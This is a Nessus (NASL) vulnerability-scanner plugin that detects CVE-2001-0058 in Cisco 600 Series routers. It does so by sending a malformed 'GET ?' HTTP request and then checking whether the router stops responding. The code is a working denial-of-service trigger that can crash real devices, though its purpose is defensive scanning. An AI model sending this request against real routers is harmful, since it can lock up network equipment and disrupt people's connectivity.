#
# (C) Tenable network Security, Inc.
#
# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: this domain no longer exists)
#      Added link to the Bugtraq message archive
#      Could support CVE-2001-0058
#

include("compat.inc");

if(description)
{
 script_id(10561);
 script_version ("$Revision: 1.23 $");
 script_cve_id("CVE-2001-0058");
 script_xref(name:"OSVDB", value:"460");

 script_name(english:"Cisco 600 Series Router HTTP GET DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote router is prone to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"It was possible to lock the remote router by sending the following
request :

  GET ?

An attacker may use this flaw to lock this host, thus preventing your
network from working properly." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2000-11/0390.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.cisco.com/warp/public/707/CBOS-multiple.shtml" );
 script_set_attribute(attribute:"solution", value:
"Contact CISCO for a fix or Add the following rule to your router :

  set web disabled
  write
  reboot" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:N/I:N/A:C" );
script_end_attributes();

 
 summary["english"] = "Crashes a Cisco router";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 family["english"] = "CISCO";
 script_family(english:family["english"]);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service1.nasl", "os_fingerprint.nasl");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

os = get_kb_item("Host/OS");
if ( os && "CISCO" >!< os ) exit(0);


port = get_http_port(default:80);
banner = get_http_banner(port:port);
if ( "cisco-IOS" >!< banner ) exit(0);

if (http_is_dead(port:port)) exit(0);

r = http_send_recv_buf(port: port, data: 'GET ? \r\n\r\n');
sleep(1);
if (http_is_dead(port: port)) security_warning(port);

